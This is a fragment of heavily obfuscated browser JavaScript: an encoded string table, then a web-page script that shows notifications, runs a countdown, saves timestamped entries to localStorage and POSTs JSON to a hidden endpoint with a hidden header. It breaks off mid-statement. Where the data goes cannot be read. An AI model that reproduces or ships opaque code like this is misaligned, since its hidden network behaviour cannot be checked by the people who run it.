12!%20N%0E%0F%0F%0C%0BfhI%13=W%1E%0B\'%18L%19%0E%1B%13%16fhI%0E%0F%0F%0C%0BfhI%13=W%1E%0B\'%18L%1B%07%1B%0B%1D!%3C%0CCMR%08%1E,-%0D%02%0E%14%0BShf3%0E%0D%1F%0D%1E%3CfGC%19%1F%1E%17#fGC%1B%16%1E%0F(!%13%06C%5CW%12*fGC-%1B%13%13/n%0F%04K%16%10%1C\'%20A8.%3E*8%1D%1E%5BKC%5CWT#/%12D%0E%02%0B%1E%3C%20%00%07=W%1E%0E:&N%18%0E%1E%0A%18=%3E%3E%1F%04%11%1A%15a)%04%05%0E%08%1E%0F+q%02%0A%19%1E%20%17/,%04%07V;%13%0E%3C/IMC=:/fhI%13=W%1E%0B\'%18L%00%0E%03W%5Df%08%00%07%03%1B_%1A!n%06%0E%19%1B%0D%5B:!%0A%0E%05Z%3E%17;%3C%00QKRYS:!%0A%0E%05RYS-/%04%07%1E%17Q%17!)%08%05E%0E%10%10+%20IMC5%0C%5B-!%0E%00%02%1F%0C%5B*+%17%0E%06Z%1C%14%20:%04%19KX%1C%1A+%22%14%06E%16%10%1C\'%20O%1F%04%11%1A%15l%60IMCU%0B%14%25+%0FD%08%15%10%10\'+%12CMR%1C%14!%25%08%0E4%12%1A%1A*+%13CMRC%0Bn=%15%12%07%1FBY:+%19%1F=W%1E%17\')%0FQK%19%1A%15:+%13PK%19%10%17!%3C%5BK%1D%1B%0D-f%18L=F%0E%1A%03:%18L%18%0E%19%10%15*/%13%12BA%5DE%00+%0F%03%1E%17_%18;%3C%12%04K%1F%11%18!%20%15%19%0A%1E%10Ura%11UC%5CW%1D!%3C$%0A%08%12W%5Df%0D%0E%05%08%16%0A-%3C%01%5C%0F%04RYS-!%14%19%18%1F)V\':%04%06KRYS-!%0C%1B%07%1F%0B%1E*fGC=%08EAnnAKKZ_%5BnnAKKZ_%5BnnAKKZ_%5Br\'%0F%1B%1E%0E_%0F7%3E%04VI%08%1E%1F\'!CK%05%1B%12%1Esl%02%04%1E%08%0C%1Eln%17%0A%07%0F%1AFlfGCIZ%16%1Fsl%02%04%1E%08%0C%1E%18cIMCX_Shf_=%19@E%5BnnAKKZ_%5BnnAKKZ_%5BnnAKKZ_G%22/%03%0E%07Z%19%14%3CsC%08%04%0F%0D%08+%18LCMR%5DEfhIKW%09%0F%1A%20p7CC%5CW%5B%18cACMRVGa=%11%0A%05DCT%22/%03%0E%07D)%09ttAKKZ_%5BnnAKKZ_%5BnnAKKZW%5Df;%13%07C%5CW%1F\'=%00%09%07%1F%1BShf%14%05%02%0E%20%15/#%04CMR%0F%09!)%13%0E%18%09W%5Df%1E%13%04%08%1F%0C%08/%20%05%04QZW%5Df%1E%13%04%08%1F%0C%08/%20%05%04ETQShf%20%1F%02%0C%16%1F/*%04QKRYS%0F)%14%0A%19%1E%1E%15*!OEERYS%3C!%14%05%0FRYS9\'%05%1F%03RYSkfGCDRYSn/%15%02%1D%13%1B%1A*+%12K%1B%08%10%18+=%12%0A%0F%1B%0C%5B%18fIMC_VShf%05%02%18%0A%13%1A7fGC%09%16%10%18%25fGC%0D%13%11%1FfhI(%0A%08%0D%1E)/%0F%0F%04TQUfhI%22%05%13%1C%12/%20%05%04ETQShf1%19%0E%0A%1E%09/%20%05%04K%15_%18;%3C%12%04K%5DW%5DfiOCMRO%5EfhI&%0A%0E%0D-%3C%01%5C%08%1E%16%1EShf(%05%02%19%16%1A%20*%0EK%06%1B%0B%09%18%3C.V%08%0F%13%1An+%0CKLRYSi%60OEC%5CWT=:%00%19%1FRYS-!%14%19%18%1F%20%0E%3C%22%12CMR%1A%03%3E%22%08%08%02%0E%20%18!!%0A%02%0E%25%17%1E/*%04%19C%5CW5%18%3C.X%04Z%19%14\'n%11%04%18%09)%09%01s%17%0E%07Z%16%15\'-%08%0A%19Z%1E%5B#/%15%19=%080F-;%0D%0AQZW%5Df%60A?%0E%14%0B%1A%20*%0EK%08%15%11%0F\'%20%14%0A%19TW%5Df%03%00%1F%19,%0D4s-%14%07%0AZ%15-%3C%01)K%19%1F%1E%17\'4%00%0F%0AZ%0F%1A%3C/ALC%5CW%5C%60n1%1E%07%1B%11%1F!n%04%18%1F%1B_%1E:/%11%0AERYSa-%14%19%18%15%0C%1F+:%00%02%07%09W%5Df-%0E%1E%19%09%1A%08%11*%04%1F%0A%13%13%08fhI%08%04%0F%0D%08+%11%0F%0A%06%1FW%5Df/%0D%074%0E%1E%08%25=IMC%1C%16%17:+%13CMR%3C%14%20-%0D%1E=%080F*/IMC3%11%1D!%3C%0C%0A=%0805%18%3C.X%04RYS%01n%02%1E%19%09%10%5BifGCLZ%11-%3C%01R%04K%0A%10%08=;%08K%1F%1B%0D%1E(/%12K%1B%1F%11%1F+%20%15%0E%18TW%5Dfa%07%02%05%13%0C%13fhI%08%04%0F%0D%08+%11%14%19%07RYS%1D;%02%0E%18%09%10Shf%22%1E%19%09%10%5BifGCLZ%15-%3C%01)K%0E%09%0B%1A8/A%0D%02%14%1E%17\'4%00%0F%04TW%5Df%00%0E;%0E%14%1B%12%20)5%0A%18%11%0CShf1%19%04%19%1A%08=!A%22%05%0E%1A%09%3C!%0C%1B%02%1E%10Shf.K%1B%08%10%18+=%12%04K%1C%10%12n%3E%00%19%0A%1E%10%5B%3E+%0D%04K%0F%0C%0E%18%3C.#%19%13%10UfhI%1F%0A%09%14$%20/%0C%0EC%5CW%09/%20%05%04%06RYS%0F)%14%0A%19%1E%1E%15*!ACMR%0C%5B%3E/%13%0AK%0A%0D%14-+%12%18%0A%08E%5BfhI%1F%04%3C%16%03+*IMC,)2%0A%0B.CMR)-%07%1D(?4517%17fGC%1F%1B%0C%10%11:%18%1B%0ERYSa8%08%0E%1CRYSa-%0E%06%1B%16%1A%0F+fGC;%08%10%18+=%12%0A%05%1E%10%5B:/%13%0E%0D%1BE%5BfhI%1F%0A%09%14$;%3C%0DCMR+%1A%3C+%07%0AK%19%10%15-%22%14=%195B%1F/tACMR)%04vsZXK9%10%15-%22%14=%195B%1F/oIMC?%0D%09!n%0F%0AK%0E%1E%09+(%00QKRYS%181YVP4_%3E%3C%3C%0EJC%5CW%0D/%3C7C=W)V+%3C%13%04%19,R%18!%22%0E%19BRYS%0B%3C%13%04K%14%1E%5B%1A/%13%0E%0D%1BW%5Df%08%00%07%03%1B_%1E#nFCMRXAnfGC-%13%11%1A%22\'%1B%0A%05%1E%10Shf\'%02%05%1B%13%124/%0F%0F%04Z%10%5B-;%13%18%04ZXShf2%1E%08%1F%0C%08!oIMC.%10%1F/=A%0A%18Z%0B%1A%3C+%07%0A%18Z%0F%1E%20*%04%05%1F%1F%0C%5B(!%13%0A%06Z%0F%09!-%04%18%18%1B%1B%1A=%60IMC?%0D%09!n%22%19=%080F:\'%02%04C%5CW4-!%13%19%0E%0F_%0E#n%04%19%19%15_%15!n%11%19%04%19%1A%08=/%0C%0E%05%0E%10AnfGC;%08%10%18+=%12%0A%06%1F%11%0F!n\'%02%05%1B%13%124/%05%04JRYSn*%04KC%5CW%5B:/%13%0E%0D%1B%0C%5B-!%0F%08%07%0F)%09%01s%05%0A%18TW%5Df-%0E%1E%19%09%1A%08fhI\'%02%09%0B%1An*%04K%08%0F%0D%08!=A%0A%1F%0F%1E%17\'4%00%0F%0A%5BW%5Df%007%19$I%10%5B(!%08K%1B%15%0C%08%18%3C.V%1D%1F%13%5B/:%14%0A%07%13%05%1A%3Cn%00K%07%13%0C%0F/n%05%0EK%19%0A%09=!%12EC%5CW%3E%3C%3C%0EK%0A%15_::;%00%07%02%00%1E%09fhI%1D%0A%16%0A%1EfhI%1F%19%13%12Shf$%19%19%15_%1F+n7=%0A%16%16%1F/%18%13$%25,%0D4%7D!IMC*%0D%1E+%20%02%03%0AZ%10%5B;=%14=%1957%09\'!A%0EK%1B_%08+%20%09%0AERYS%0B%20%02%04%05%0E%0D%1A*!%12KC%5CW%5B-;%13%18%04%09%5EShf/=%195L%14n(%0E%02K%0A%10%08=%18%13$V%0C%1A%17n!%03%1F%0E%08_%1An%22%08%18%1F%1B_%1F+n%02%1E%19%09%10%08%60fGC%18%0F%1D%16\':IMC%0A%0D%1E8+%0F%1F/%1F%19%1A;%22%15CMR%0B%02%3E+IMC%0E%1A%03:fGCW%13_%18%22/%12%18VX%19%1A=n%07%0A=W%1A%02+%18L%18%07%1B%0C%13lp%5DD%02DW%5Dfr%08K%08%16%1E%08=sC%0D%0A%09_%1D/%18L%0E%12%1F%5DEra%08UC%5CW%0F/%3C%06%0E%1FRYS-%22%0E%18%0E%09%0BShf%03%1E%1F%0E%10%15fhI%0F%0A%0E%1E%08+:IMC%16%10%1C\'%20IMC%19%10%15:/%08%05%18RYS,:%0F=F%0F%0C%1EfhI(%04%14%0B%1An%0D%00%19%19%1F%18%1A*/IMC9%13%12?;%04K%0E%17_Y%0C;%12%08%0A%08_8;%3C%12%04%18X_%0B/%3C%00K%1D%1B%13%12*/%13D%19%1F%11%148/%13K%1F%15%14%1E%20%60IMC%18%0B%15%18c%05%0E%07%1F%0B%1EfhI;%04%08_%1D/8%0E%19GZ%1C%14%22+A%04%18Z%1C%14!%25%08%0E%18TW%5Df%02%0E%0C%02%14_%09+/%0D%02%11%1B%1B%14n-%0E%06K%19%10%14%25\'%04%18JRYS?;%04%19%12)%1A%17+-%15%04%19;%13%17fhIE%08%16%10%08+%18L%09%1F%14W%5Df#%0E%0F%0A%166%1FfhI%08%03%1B%11%1C+fGC%05%1B%12%1EfhI%08%04%0F%0D%08+fGC%08%12%1A%18%25+%05CMR%0B%14))%0D%0EC%5CW%12%20%3E%14%1F0%14%1E%16+sC%08%04%0F%0D%08+l%3CQ%08%12%1A%18%25+%05CMR1%1E%20&%14%06K%19%0A%09=!A%18%0E%16%1A%18\'!%0F%0A%0F%15QShf.%18K%0C%1E%17!%3C%04%18K%1E%1A%5B:+%0C%1B%04Z%0C-%3C%01R%04K%13%11%0D%18%3C.#%07%13%1B%14=%60IMC%17%10%1F/%22I%3CZ%16%00%1F\'0%02%0E%0FP8\'3=CH%1A%02%10%0516%05AIQ.,o%1F6H:%5BTZ%1F%19@@J+(Zeo0%3C%3C%0D%13%04*\'%1F%08%0E%1EU%16%16*%12IH%0B%07%1401%19%0FAX%5EPo%1F6J@%5B.,mo0%3C%1C%16%00%1F\'0%02%0E%0FP%3C%225=CH%1A%02%10%0516%05A%06%00%107lm@%02%08%3E%3CYmo&%19%182%5DXo%05%0C2%18X%5CZ%05#8%18IY%5E$%0C%0A#IH%5B,%18%17%01CHJ!09%0ClBJ%16*42lm@,7%07%0CYmo%3E)/8%5DX9%22%1E%0F%02%04%1C%1E*d%22%0C%04%0A%5DX?6%0E%15%14%02%1BQloJJ:-%5EYoo0J:-(*o%1F6%3CHY%5EYl#%0F/%16X%5CXnl%22*46%5DXmm%16%07%14%1E%16%05-+%05A%0A%1F%1D%0Bl%01%018%18Y%0E%03!0%1E%13%0FP%1A%13%00%010$%0B)%0C,%7F9%0D%14%0F%13%01%18+*K%06%0D%12%0FYm?%19%04%15%05%07%1Fdl&%11%0A%0A%5DXm%1F%04%1B#2%5DX%19l:0%067%5DXm9%0D%14%0F%13%01%18+*K%20%06#%0CYm?%19%04%15%05%07%1Fdc7%14Q@BAc9%22%00\'1%5DX%7F%22%1E%0F%02%04%1C%1E*d%08%087%09%5DX?6%0E%15%14%02%1BQl#%07%03%1BX%5CX%1F%0D8%10%18X%5C,lm%16%07%14%1E%16%05-+%05A%16%148%08lm%10%13%04%04%00%03*dC8%14%021Ymm0(2%01%0CYm%19CH%1C%16%00%1F\'0%02%0E%0FP,%14%14=CH%1A%02%10%0516%05AI%04%0C%01!+%0DA@+(X%1Fo0%3C%3C%0D%13%04*\'%1F%08%0E%1EU(=%07%11IH%0B%03%106d*%20\'%0AHYr%7C%5CSW%5DE%1Evt%5DPRA%5CJ3,%02%0D%04X40%02%3EWIV@FEri%5B%0ESADCpqBH%12%07%1C%05\',C%20%206%0FX?\'%0A%12%04P%5D@%7Dr%5CQRUE%1Evt%5BQSF%5CK%05%05-%1B%5CQ%205%0F%06TIPICG%7CtNQ%0EBEAtvXH%5BXE%09wt%5B%20WUE%1Evt%5BQTC%5CJ&6%0E%00%0AK%16%107!KIQ%1FGAuw%5EWL@%0D@tv/\'HJ40%02%3EVIWHDCri%5B%0ES@AFsuBZ%1A%13%1A%1F70K4%17%07%0FL%11%00%20#%5C6%00%1F\'0%02%0E%0FX%02%01%20%0CC%12%10%191Ymh%049%1B%09%5DXh%09%1B%0A%1BX%5C%5D3(%0A#IY%5CXlmP8.%150Ym%7F%07%04%15P%02%09%3E%3EV4%17%07%0F*%05+2*IY%5E(5##IH-N%07%256K0%12%01%0FLlt%04PQ@E@wvNQ%19AEAutBZ%16%18%1C%1D!l:%12%10%0AIYvrYSX@PA+v%5BQQC@Xm7%1C%08%15%13%1DY%157%1A%1BH%0B%16%107!KIQ%1FGAqp%5EULFMBstB%5B0%03%04%0Bye%1C%19%1B%0AJYt+YQREDGir%5CRYI%5CKlt%04SQECFti%5B%19P@7H%05mP%03%13%15%14%1A%7F\'%0A%12%04P%5DA%3Cu%5BU%20FXA+v%5BSSB@X~%15%18%10%1BM%5DA+v%5BSVCA%5Crs%5BQWYN%0A%11%00%20#:%13%14%0B%03lB%3C%5C%25%03%06%3E%1F%22%0C69%5DXo%09%0F%25*X%5C,%7F%11%1D%16%1B+%1A%1F\'%00CH%3CM%3C&0%01P%1C%03%02%10%10/%7F%16%1C%03%02%10%10/%7F%16%13%04%04%00%03*d%3E%25*2N%0C%221%05%02%15%19%1A%1Fd7%1E%15%1BX%5C%0A6!%1F%14%13%1EU$%0C%0A#IH%5B$(1%0DCHJ%1B%168%05lBJ%06%22%1B%08lm%16%07%14%1E%16%05-+%05A,%00%1E%0Blm%10%13%04%04%00%03*dCJ:+%5E*%1FoJ:%3C%5BTZ%1F%196J:%5B.,%19%19@:%3C-.Z%1F%196:J+(,%19m@II9%14%09%0FlBHKX%02;%15%0CCHHY%08%3C(%1E(IHK%13%04*\'%1F%08%0E%1EU%1E6*%11IH%0B%07%1401%19%0FAX%166%08%02CHH+%3C%225=CH%3CX%5C%0C%221%05%02%15%19%1A%1Fd+\'%00%20X%5C%0A6!%1F%14%13%1EUY%1F%190:%3C-%5E*%19m0JJ+%5EZ%1F%1F6%3C:%5B.,%19%190J:-(,9%22%1E%0F%02%04%1C%1E*d:,%051%5DX?6%0E%15%14%02%1BQ%05%15%03$IY%5E(-%17.IH%5B%16%18%0A%0DCHJ5%172%03lBJ%12%05%19;lm@0$8=Ymo%04%25$8%5DXo31%20%22X%5CZ%1D-8$IY%5E%20%01%0C#IH%5B%16%18%0A%0DCHJ%1F9%10%05lBJ48;9lm%16%07%14%1E%16%05-+%05A%0A9%20%0Blm%10%13%04%04%00%03*d%00%02(1%5DXo%11#/)X%5CZ3(8*IY%5E4%00%08%11IH%5B%12%01!%02CHJ5%172%03lBJ%0E409lm%16%07%14%1E%16%05-+%05A,:-%0Blm%10%13%04%04%00%03*d%22%0853%5DXo3%1F%0E%25X%5CZ%11%14%01%20IY%5E%16%16*%12IH%0D%13%04*\'%1F%08%0E%1EU%16%02%0B%11IH%0B%07%1401%19%0FA!%12#%05lBJ%0E409lm@%16;16Ymo2%0825%5DXo%01%09%22&X%5CZ%15%01#)IY%5E%12-%0A%22IH%5B%1A=%25%05CHJ%25=?%0ClBJ%0E$%1A2lm@%06%11%153Ym9%0D%14%0F%13%01%18+*K(&%22%0FYm?%19%04%15%05%07%1Fd%11#/)X%5CZ3(8*IY%5E%164!-IH%5B,%18%17%01CHJ9%1C%25%07lBJ48;9lm@,7%07%0CYm9.%0F%036%5DX%7F%22%1E%0F%02%04%1C%1E*d%08%22(%0A%5DX?6%0E%15%14%02%1BQ%11%0C%25)IY%5E%20%1D1%22IH%5B%1E%12%0D%05CHJ%17\'%1F=lBJ%12?%120lm@%16%0D#%3EYmo%08%08/9%5DXo#9%0F%18X%5C%0C%221%05%02%15%19%1A%1Fd%01/-%1BX%5C%0A6!%1F%14%13%1EUY0=%1B%04%0E%16UY%1F%19@:%3CY%5C*oe@:%3C%5BTZ%1F%19@@J+(Zeo0%3CJQ%5E*%19%19%16%07%14%1E%16%05-+%05A%06%14;%06lm%10%13%04%04%00%03*dCJJ+%5E*%19%190J:-(Zlo@:J+(,%1Fo0%3C%3CY%5CZlo0%3CJQ%5E*%19m%16%0C8)D_%05%033$%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EU@q9P%0C8)D_%11w;$%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUBr9P%0C8)D_3%068$%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUCp9P%0C8)D_%15%1D%20$%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUCw9P%0C8)D_73%25$%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUBs9P%0C8)D_%09%10-$%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUB%7C9P%0C8)D_+0%0D\'%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EU@s9P%0C8)D_%15t%03\'%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUC%7D9P%0C8)D_%09%12%08\'%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EU@v9P%0C8)D_#.%5E$%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUBq9P%0C8)D_%0D%15%5C$%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUBw9P%0C8)D_\'!%5B$%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUB%7D9P%0C8)D_%01%0A%11\'%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EU@p9P%0C8)D_#((\'%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUCv9P%0C8)D_%05%0D%1E\'%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUC%7C9P%0C8)D_\'#%13\'%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUBt9P%0C8)D_%1D%25%18\'%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUCu9P%0C8)D_7=%00\'%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUCr9P%0C8)D_%11q%06\'%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUBu9P%0C8)D_+(%5C%22%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EU@%7D9P%0C8)D_%15%17R%22%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EU@%7C9P%0C8)D_/#Y%22%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUEt9P%0C8)D_%09%14)%25%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUBv9P%0C8)D_%0D1%0C%1B%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUCs9P%0C8)D_/v%02%1B%5C%16%00%1F\'0%02%0E%0FX%5C%0A6!%1F%14%13%1EUH9%7F%0688A%5B%12%11%02%11%5C%07%05%1B%120-%04%0FIY%0E%03!0%1E%13%0FPM%0C%7F)28P%5E0%03%0D%3EV%07%14%1E%16%05-+%05IH%0B%07%1401%19%0FAAD%0C9m\")")}();document[mYY1.GdJZ(0)](mYY1.Gfg0(1),()=>{const IeQw={[mYY1.y55Z(2)]:mYY1.WzA0(3),[mYY1.Kkl0(4)]:mYY1.OhiY(5),[mYY1.C22X(6)]:mYY1.uUpY(7),[mYY1.GdJZ(8)]:mYY1.Gfg0(9),[mYY1.y55Z(10)]:mYY1.WzA0(11)};let caHw=(NaN===NaN);let EbKw=(NaN===NaN);let YWAw=null;let AYDw=[];const UTuw={[mYY1.Kkl0(12)]:document[mYY1.OhiY(13)](mYY1.Kkl0(12)),[mYY1.C22X(14)]:document[mYY1.OhiY(13)](mYY1.uUpY(15)),[mYY1.GdJZ(16)]:document[mYY1.OhiY(13)](mYY1.Gfg0(17)),[mYY1.y55Z(18)]:document[mYY1.WzA0(19)](mYY1.Kkl0(20)),[mYY1.OhiY(21)]:document[mYY1.OhiY(13)](mYY1.OhiY(21)),[mYY1.C22X(22)]:document[mYY1.OhiY(13)](mYY1.C22X(22)),[mYY1.uUpY(23)]:document[mYY1.OhiY(13)](mYY1.uUpY(23)),[mYY1.GdJZ(24)]:document[mYY1.OhiY(13)](mYY1.GdJZ(24)),[mYY1.Gfg0(25)]:document[mYY1.OhiY(13)](mYY1.Gfg0(25)),[mYY1.y55Z(26)]:document[mYY1.OhiY(13)](mYY1.y55Z(26)),[mYY1.WzA0(27)]:document[mYY1.OhiY(13)](mYY1.WzA0(27)),[mYY1.Kkl0(28)]:document[mYY1.OhiY(13)](mYY1.Kkl0(28)),[mYY1.OhiY(29)]:document[mYY1.OhiY(13)](mYY1.OhiY(29)),[mYY1.C22X(30)]:document[mYY1.OhiY(13)](mYY1.C22X(30)),[mYY1.uUpY(31)]:document[mYY1.OhiY(13)](mYY1.uUpY(31)),[mYY1.GdJZ(32)]:document[mYY1.OhiY(13)](mYY1.GdJZ(32)),[mYY1.Gfg0(33)]:document[mYY1.OhiY(13)](mYY1.y55Z(34)),[mYY1.WzA0(35)]:document[mYY1.OhiY(13)](mYY1.Kkl0(36)),[mYY1.OhiY(37)]:document[mYY1.OhiY(13)](mYY1.C22X(38)),[mYY1.uUpY(39)]:document[mYY1.OhiY(13)](mYY1.GdJZ(40)),[mYY1.Gfg0(41)]:document[mYY1.OhiY(13)](mYY1.Gfg0(41)),[mYY1.y55Z(42)]:document[mYY1.OhiY(13)](mYY1.y55Z(42)),[mYY1.WzA0(43)]:document[mYY1.OhiY(13)](mYY1.WzA0(43)),[mYY1.Kkl0(44)]:document[mYY1.OhiY(13)](mYY1.Kkl0(44)),[mYY1.OhiY(45)]:document[mYY1.OhiY(13)](mYY1.OhiY(45)),[mYY1.C22X(46)]:document[mYY1.OhiY(13)](mYY1.C22X(46)),[mYY1.uUpY(47)]:document[mYY1.OhiY(13)](mYY1.uUpY(47)),[mYY1.GdJZ(48)]:document[mYY1.OhiY(13)](mYY1.GdJZ(48))};function wVxw(wplx,Yqox,smfx=mYY1.Gfg0(49),Unix=3000){const ojZw=document[mYY1.y55Z(50)](mYY1.WzA0(51));ojZw[mYY1.Kkl0(52)]=`${mYY1.OhiY(53)}${smfx}`;ojZw[mYY1.C22X(54)]=`${mYY1.uUpY(55)}${wplx}${mYY1.GdJZ(56)}${Yqox}${mYY1.Gfg0(57)}`;UTuw[mYY1.GdJZ(48)][mYY1.y55Z(58)](ojZw);setTimeout(()=>ojZw[mYY1.WzA0(59)][mYY1.Kkl0(60)](mYY1.OhiY(61)),10);const Qkcx=()=>{ojZw[mYY1.WzA0(59)][mYY1.C22X(62)](mYY1.OhiY(61));setTimeout(()=>ojZw[mYY1.C22X(62)](),400);};const kgTw=setTimeout(Qkcx,Unix);ojZw[mYY1.GdJZ(0)](mYY1.uUpY(63),()=>{clearTimeout(kgTw);Qkcx();});}function MhWw(MBJx,oDMx){var IyDx=mYY1[mYY1.GdJZ(64)]();while(IyDx<mYY1[mYY1.Gfg0(65)]())switch(IyDx){case (0x75bcd15-0O726746425):IyDx=oDMx?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.WzA0(67)]();break;case (0O57060516-0xbc614d):IyDx=mYY1[mYY1.Gfg0(65)]();{MBJx[mYY1.WzA0(59)][mYY1.Kkl0(60)](mYY1.OhiY(61));}break;case (15658734^0O73567354):IyDx=mYY1[mYY1.Gfg0(65)]();{MBJx[mYY1.WzA0(59)][mYY1.C22X(62)](mYY1.OhiY(61));}break;}}const kAGx=Evxx=>new Promise(gxAx=>setTimeout(gxAx,Evxx));async function Asrx(cuux){return new Promise(cOhy=>{let EPky=cuux;UTuw[mYY1.Kkl0(44)][mYY1.Kkl0(68)]=`${EPky}${mYY1.OhiY(69)}`;UTuw[mYY1.Kkl0(44)][mYY1.C22X(70)][mYY1.uUpY(71)]=mYY1.GdJZ(72);const YKby=setInterval(()=>{EPky--;var AMey=mYY1[mYY1.GdJZ(64)]();while(AMey<mYY1[mYY1.Gfg0(65)]())switch(AMey){case (0x75bcd15-0O726746425):AMey=EPky>(0x75bcd15-0O726746425)?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.WzA0(67)]();break;case (0O57060516-0xbc614d):AMey=mYY1[mYY1.Gfg0(65)]();{UTuw[mYY1.Kkl0(44)][mYY1.Kkl0(68)]=`${EPky}${mYY1.OhiY(69)}`;}break;case (15658734^0O73567354):AMey=mYY1[mYY1.Gfg0(65)]();{clearInterval(YKby);UTuw[mYY1.Kkl0(44)][mYY1.Kkl0(68)]=mYY1.Gfg0(73);UTuw[mYY1.Kkl0(44)][mYY1.C22X(70)][mYY1.uUpY(71)]=mYY1.y55Z(74);cOhy();}break;}},1000);});}function UHVx(){try{return JSON[mYY1.WzA0(75)](localStorage[mYY1.Kkl0(76)](IeQw[mYY1.y55Z(10)]))||{};}catch(wJYx){console[mYY1.OhiY(77)](mYY1.C22X(78),wJYx);return {};}}function QEPx(sGSx,UfUu=null,whXu=null){try{const QcOu=UHVx();const seRu=sGSx[mYY1.uUpY(79)](mYY1.GdJZ(80));var MZHu=mYY1[mYY1.GdJZ(64)]();while(MZHu<mYY1[mYY1.Gfg0(65)]())switch(MZHu){case (0x75bcd15-0O726746425):MZHu=seRu?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.WzA0(67)]();break;case (0O57060516-0xbc614d):MZHu=mYY1[mYY1.Gfg0(65)]();{QcOu[sGSx]={[mYY1.Gfg0(17)]:UfUu};}break;case (15658734^0O73567354):MZHu=mYY1[mYY1.Gfg0(65)]();{QcOu[sGSx]={[mYY1.Gfg0(81)]:whXu,[mYY1.y55Z(82)]:Date[mYY1.WzA0(83)]()};}break;}localStorage[mYY1.Kkl0(84)](IeQw[mYY1.y55Z(10)],JSON[mYY1.OhiY(85)](QcOu));}catch(obLu){console[mYY1.OhiY(77)](mYY1.C22X(86),obLu);wVxw(mYY1.uUpY(87),mYY1.GdJZ(88),mYY1.OhiY(77));}}function IWBu(kYEu){try{const kssv=UHVx();delete kssv[kYEu];localStorage[mYY1.Kkl0(84)](IeQw[mYY1.y55Z(10)],JSON[mYY1.OhiY(85)](kssv));gpmv();}catch(Mtvv){console[mYY1.OhiY(77)](mYY1.Gfg0(89),Mtvv);}}function gpmv(){UTuw[mYY1.OhiY(29)][mYY1.C22X(54)]=mYY1.y55Z(90);const Iqpv=UHVx();var cmgv=mYY1[mYY1.GdJZ(64)]();while(cmgv<mYY1[mYY1.Gfg0(65)]())switch(cmgv){case (0x75bcd15-0O726746425):cmgv=Object[mYY1.WzA0(91)](Iqpv)[mYY1.Kkl0(92)]===(0x75bcd15-0O726746425)?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):cmgv=mYY1[mYY1.Gfg0(65)]();{UTuw[mYY1.OhiY(29)][mYY1.C22X(54)]=mYY1.OhiY(93);return;}break;}for(const Enjv in Iqpv){const Yiav=Iqpv[Enjv];const Akdv=!Yiav[mYY1.y55Z(82)]||(Date[mYY1.WzA0(83)]()-Yiav[mYY1.y55Z(82)]>(0x5E30A78-0O570605164)*60*60*1000);const AEQv=document[mYY1.y55Z(50)](mYY1.WzA0(51));AEQv[mYY1.Kkl0(52)]=mYY1.C22X(94);AEQv[mYY1.C22X(54)]=`${mYY1.uUpY(95)}${Enjv}${mYY1.GdJZ(96)}${Akdv?mYY1.Kkl0(100):mYY1.y55Z(90)}${mYY1.Gfg0(97)}${Enjv}${mYY1.y55Z(98)}${Enjv}${mYY1.WzA0(99)}`;UTuw[mYY1.OhiY(29)][mYY1.y55Z(58)](AEQv);}}async function cGTv(wBKv,YCNv){const syEv=await fetch(`${IeQw[mYY1.Kkl0(4)]}${mYY1.y55Z(90)}${wBKv}`,{[mYY1.OhiY(101)]:mYY1.C22X(102),[mYY1.uUpY(103)]:{[mYY1.GdJZ(104)]:mYY1.Gfg0(105),[mYY1.y55Z(106)]:IeQw[mYY1.C22X(6)]},[mYY1.WzA0(107)]:JSON[mYY1.OhiY(85)](YCNv)});const UzHv=await syEv[mYY1.Kkl0(108)]();var ovyv=mYY1[mYY1.GdJZ(64)]();while(ovyv<mYY1[mYY1.Gfg0(65)]())switch(ovyv){case (0x75bcd15-0O726746425):ovyv=!syEv[mYY1.OhiY(109)]||!UzHv[mYY1.C22X(110)]?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):ovyv=mYY1[mYY1.Gfg0(65)]();{throw new Error(UzHv[mYY1.uUpY(111)]||`${mYY1.GdJZ(112)}${syEv[mYY1.Gfg0(113)]}`);}break;}return UzHv;}async function QwBv(QQow,sSrw){const MNiw=QQow[mYY1.uUpY(79)](mYY1.GdJZ(80));const oPlw=UHVx()[QQow];var IKcw=mYY1[mYY1.GdJZ(64)]();while(IKcw<mYY1[mYY1.Gfg0(65)]())switch(IKcw){case (0x75bcd15-0O726746425):IKcw=MNiw?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.WzA0(67)]();break;case (0O57060516-0xbc614d):IKcw=mYY1[mYY1.Gfg0(65)]();{const kMfw=await 